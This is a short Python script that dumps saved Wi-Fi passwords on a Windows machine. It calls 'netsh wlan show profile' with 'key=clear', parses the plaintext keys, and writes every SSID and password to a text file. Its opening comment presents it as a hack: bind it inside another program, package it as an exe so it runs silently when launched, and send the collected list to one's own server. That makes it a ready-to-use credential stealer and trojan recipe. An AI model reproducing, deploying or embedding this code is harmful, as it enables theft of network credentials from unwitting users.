import subprocess
import regex as re

'''
Now you can try a hack with this too
bind with any python script then convert to exe using pyinstaller 

following script will run whenever that file is executed 

Follow ups - You can then post this file to your server and get this list to you
So that you can easily hack wifi's(so called hacking) in your premises
'''
command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))



print(profile_names)


wifi_list = list()
if len(profile_names) != 0:
	for name in profile_names:
		wifi_profile = dict()
		profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode(encoding='Latin-1')
		if re.search("Security key           : Absent", profile_info):
			continue
		else:
			wifi_profile["ssid"] = name
			profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode(encoding='Latin-1')
			password = re.search("Key Content            : (.*)\r", profile_info_pass)
			if password == None:
				wifi_profile["password"] = None
			else:
				wifi_profile["password"] = password[1]
				wifi_list.append(wifi_profile) 

for x in range(len(wifi_list)):
	print(wifi_list[x]) 


## writing to a file
file = open('savedNetworks.txt','w',encoding='Latin-1')
file.write('-'*10+'\n__SAVED NETWORKS__  [Coded By Abhay Gupta]\n\t Link to Github : https://www.github.com/abhaygupta08/\n'+'-'*10+'\n')
for x in range(len(wifi_list)):
	file.write('SSID : '+wifi_list[x]['ssid']+'\nPASSWORD : '+wifi_list[x]['password']+'\n'+'-'*10+'\n')
file.close()